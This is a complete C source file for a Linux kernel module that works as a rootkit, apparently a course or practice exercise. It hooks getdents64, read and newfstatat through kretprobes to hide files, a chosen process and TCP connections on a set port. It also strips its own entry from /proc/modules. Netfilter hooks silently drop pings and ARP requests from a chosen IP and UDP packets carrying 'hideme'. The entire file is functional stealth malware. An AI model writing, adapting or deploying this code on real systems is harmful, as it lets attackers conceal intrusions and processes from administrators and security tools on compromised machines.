#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/kthread.h>
#include <linux/kprobes.h>
#include <linux/fprobe.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/sched.h>
#include <linux/mm_types.h>
#include <linux/sched/signal.h>

#include <linux/netfilter.h>
#include <linux/netfilter_arp.h>
#include <uapi/linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/if_arp.h>

#include "helpers.h"
#include "step1.h"
#include "step3.h"

static char* hide_file_name = "FILE";
module_param(hide_file_name, charp, S_IRWXU);
MODULE_PARM_DESC(hide_file_name, "Hide any file that has the name.");

static int port_to_hide = 8000;
module_param(port_to_hide, int, S_IRWXU);
MODULE_PARM_DESC(port_to_hide, "Hide all tcp sockets that is using this port.");

static int pid_to_hide_n = 9704;
module_param(pid_to_hide_n, int, S_IRWXU);
MODULE_PARM_DESC(pid_to_hide_n, "Hide process with this PID.");

static char* selected_ip_str = NULL;
module_param(selected_ip_str, charp, S_IRWXU);
MODULE_PARM_DESC(selected_ip_str, "ip to hide packets from.");

static char selected_ip[4] = {0, 0, 0, 0};

static char* pid_to_hide_path[256] = {0};


struct getdent64_arguments {
    unsigned int fd;
    void* buffer_ptr;
    unsigned int count;
};


static int getents64_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct getdent64_arguments*)ri->data;

    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->buffer_ptr = (void*)regs->si; // 1
    args->count = regs->dx; // 2

    return 0;
}

static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
    unsigned long buffer_count = regs_return_value(regs);

    // end 
    if(buffer_count == 0)
        return 0;

    // hide by name
    unsigned long new_size_after_hide_file = step1_hide_file_by_name(args->buffer_ptr, buffer_count, hide_file_name);
    regs_set_return_value(regs, new_size_after_hide_file);

    //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
    return 0;
}

struct read_arguments {
    unsigned int fd;
    char* buffer_ptr;
    unsigned int count;
};

static int read_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct read_arguments*)ri->data;

//    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->buffer_ptr = (char*)regs->si; // 1
    args->count = regs->dx; // 2

    return 0;
}

static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_arguments* args = (struct read_arguments*) ri->data;
    unsigned long buffer_count = regs_return_value(regs);

    // filter socket
    char fd_path[256];

    struct file* file = files_lookup_fd_raw(current->files, args->fd);
    struct dentry* dentry = file->f_path.dentry;
    char* path = dentry_path_raw(dentry, fd_path, 256);

    struct super_block* sb= file->f_path.mnt->mnt_sb;

    // pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
    // pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);

    // do not intercept read syscall with 0 return value 
    // this means end of file reached
    if(buffer_count == 0)
        return 0;

    ssize_t new_size_step3 = step3_hide_pid(sb->s_id, path, args->buffer_ptr, buffer_count, port_to_hide);

    if(new_size_step3 != -1){
        regs_set_return_value(regs, new_size_step3);
        return 0;
    }

    // intercepting only /proc/net/tcp or /proc/pid/net/tcp
    if(strcmp(sb->s_id, "proc") == 0){
        if(strcmp(path, "/modules") == 0){
            int module_name_len = strlen(KBUILD_MODNAME);

            char* delete_from_ptr = NULL;
            int delete_length = -1;

            {
                char* current_ptr = args->buffer_ptr;
                char* row_start_ptr = current_ptr;
                const char* end_ptr = args->buffer_ptr + buffer_count;

                while(current_ptr < end_ptr){
                    // go to end of line
                    while(*current_ptr != '\n') ++current_ptr;
                    // skip \n
                    ++current_ptr;

                    int row_length = (int)(current_ptr - row_start_ptr);

                    if(strncmp(row_start_ptr, KBUILD_MODNAME, module_name_len) == 0){
                        delete_from_ptr = row_start_ptr;
                        delete_length = row_length;
                        break;
                    }
                    row_start_ptr = current_ptr;
                }
            }

            if(delete_from_ptr){
                pr_info("HIDING module %s\n", KBUILD_MODNAME);
                int offset = (int)(delete_from_ptr - args->buffer_ptr);

                // if not at end copy to override the line to hide
                if(offset + delete_length != buffer_count){
                    char *copy_from_ptr = delete_from_ptr + delete_length;
                    unsigned long left_to_copy = buffer_count - offset - delete_length;
                    strncpy(delete_from_ptr, copy_from_ptr, left_to_copy);
                }
                regs_set_return_value(regs, buffer_count - delete_length);
            }
        }
    }
    return 0;
}

struct newfstatat_arguments {
    unsigned int fd;
    char* pathname;
    void* result_ptr;
};

static int newfstatat_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct newfstatat_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct newfstatat_arguments*)ri->data;

//    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->pathname = (char*)regs->si; // 1
    args->result_ptr = (void*)regs->dx; // 2

    return 0;
}

static int newfstatat_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct newfstatat_arguments* args = (struct newfstatat_arguments*) ri->data;
    unsigned long result = regs_return_value(regs);

    if(strcmp(args->pathname, (const char *) pid_to_hide_path) == 0){
        pr_info("HIDE -> newfstatat(%s) = %ld\n", args->pathname, result);
        regs_set_return_value(regs, -1);
        return 0;
    }

    return 0;
}


static unsigned int netfilter_ip_hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    // struct ethhdr *eth = eth_hdr(skb);
    struct iphdr *ip = ip_hdr(skb);

    // printk("caller: %s\n", current->comm);
    // printk("mac: %pM\n", eth->h_source);
    // printk("ip protocol: %d\n", ip->protocol);
    // printk("ip protocol: %d\n", ip->protocol);
    // printk("%pI4 -> %pI4\n", &ip->saddr, &ip->daddr);

    unsigned long ip_source = ip->saddr;
    unsigned long my_ip = 0;
    memcpy(&my_ip, selected_ip, 4);

    switch (ip->protocol)
    {
    case IPPROTO_ICMP:
    {
        if (ip_source == my_ip)
        {
            struct icmphdr *icmp = icmp_hdr(skb);

            // ping
            if (icmp->type == ICMP_ECHO)
            {
                pr_info("Dropping PING %pI4\n", &ip_source);
                return NF_DROP;
            }
        }
        break;
    }
    case IPPROTO_UDP:
    {
        struct udphdr *udp = udp_hdr(skb);
        void *payload = ((char *)udp) + sizeof(struct udphdr);

        char *message = payload;
        if (memchr(message, '\0', 1024) != NULL)
        {
            if (strcmp(message, "hideme") == 0)
            {
                pr_info("HIDING UDP message: %s\n", message);
                return NF_DROP;
            }
        }
        else
        {
            pr_info("UDP message is nbt string\n");
        }

        break;
    }
    }

    return NF_ACCEPT;
}

struct arp_ip_request {
    unsigned char sender_ha_addr[ETH_ALEN];
    unsigned char sender_ip_addr[4];
    
    unsigned char target_ha_addr[ETH_ALEN];
    unsigned char target_ip_addr[4];
};

static unsigned int netfilter_arp_hook_func(void * priv, struct sk_buff * skb, const struct nf_hook_state * state){
    struct arphdr * arp = arp_hdr(skb);
    struct arp_ip_request  arp_request;
    unsigned short op = ntohs(arp->ar_op);

    // only ARP IP request
    if(op != ARPOP_REQUEST || ntohs(arp->ar_pro) != ETH_P_IP){
        return NF_ACCEPT;
    }

    // copy to buffer
    if(skb_copy_bits(skb, sizeof(struct arphdr), (void*)&arp_request, sizeof(struct arp_ip_request)) < 0){
        pr_warn("Cannot copy from packet\n");
        return NF_ACCEPT;
    }

    // pr_info("ARP from %pI4 Searching %pI4\n", arp_request.sender_ip_addr, arp_request.target_ip_addr);

    unsigned long my_ip = 0;
    memcpy(&my_ip, selected_ip, 4);
    unsigned long sender_ip = 0;
    memcpy(&sender_ip, arp_request.sender_ip_addr, 4);

    if(sender_ip == my_ip){
        pr_info("DROPING ARP from %pI4 Searching %pI4\n", arp_request.sender_ip_addr, arp_request.target_ip_addr);
        return NF_DROP;
    }

    return NF_ACCEPT;
}



static const int net_hook_count = 2;
static struct nf_hook_ops net_hooks[] = {
    {
        .hook = netfilter_ip_hook_func,
        .hooknum = NF_INET_PRE_ROUTING,
        .pf = NFPROTO_INET,
        .priority= NF_IP_PRI_FIRST
    },
    {
        .hook = netfilter_arp_hook_func,
        .hooknum = NF_INET_PRE_ROUTING,
        .pf = NFPROTO_ARP,
        .priority= NF_IP_PRI_FIRST
    }
};


static struct kretprobe getdents64_kret_probe = {
        .maxactive = 20,
        .entry_handler = getents64_handle_entry,
        .handler = getents64_handle_return,
        .kp.symbol_name = "__x64_sys_getdents64",
        .data_size = sizeof(struct getdent64_arguments),
};

static struct kretprobe read_kret_probe = {
        .maxactive = 20,
        .entry_handler = read_handle_entry,
        .handler = read_handle_return,
        .kp.symbol_name = "__x64_sys_read",
        .data_size = sizeof(struct read_arguments),
};

static struct kretprobe newfstatat_kret_probe = {
    .maxactive = 20,
    .entry_handler = newfstatat_handle_entry,
    .handler = newfstatat_handle_return,
    .kp.symbol_name = "__x64_sys_newfstatat",
    .data_size = sizeof(struct newfstatat_arguments),
};


static int __init entrypoint(void)
{
    if(selected_ip_str == NULL){
        pr_err("Ip is not configured.\n");
        return -EINVAL;
    }

    if(sscanf(selected_ip_str, "%hhd.%hhd.%hhd.%hhd", &(selected_ip[0]), &(selected_ip[1]),&(selected_ip[2]),&(selected_ip[3])) != 4){
        pr_err("Invalid ip is configured %s.\n", selected_ip_str);
        return -EINVAL;
    }

    sprintf((char *) pid_to_hide_path, "/proc/%d", pid_to_hide_n);


    if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0 || register_kretprobe(&newfstatat_kret_probe) < 0) {
        pr_info("register_kretprobe failed\n");
        return -1;
    }

    if(nf_register_net_hooks(&init_net, net_hooks, net_hook_count) < 0){
        pr_info("nf_register_net_hook failed\n");
        return -1;
    }


    pr_info("yarin_module registered; hide_file_name='%s', hide_port=%d, hide_pid=%d, block_ip=%s\n", hide_file_name, port_to_hide, pid_to_hide_n, selected_ip_str);
    return 0;
}

static void __exit cleanup(void){
    pr_info("getdents64_kret_probe Missed probing %d instances of %s\n",
            getdents64_kret_probe.nmissed, getdents64_kret_probe.kp.symbol_name);

    pr_info("read_kret_probe Missed probing %d instances of %s\n",
            read_kret_probe.nmissed, read_kret_probe.kp.symbol_name);

    pr_info("newfstatat_kret_probe Missed probing %d instances of %s\n",
        newfstatat_kret_probe.nmissed, newfstatat_kret_probe.kp.symbol_name);
    
    
    unregister_kretprobe(&getdents64_kret_probe);
    unregister_kretprobe(&read_kret_probe);
    unregister_kretprobe(&newfstatat_kret_probe);
    nf_unregister_net_hooks(&init_net, net_hooks, net_hook_count);

    pr_info("Yarin Module cleanup\n");
}

module_init(entrypoint)
module_exit(cleanup)
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yarin");
MODULE_DESCRIPTION("Test Module");

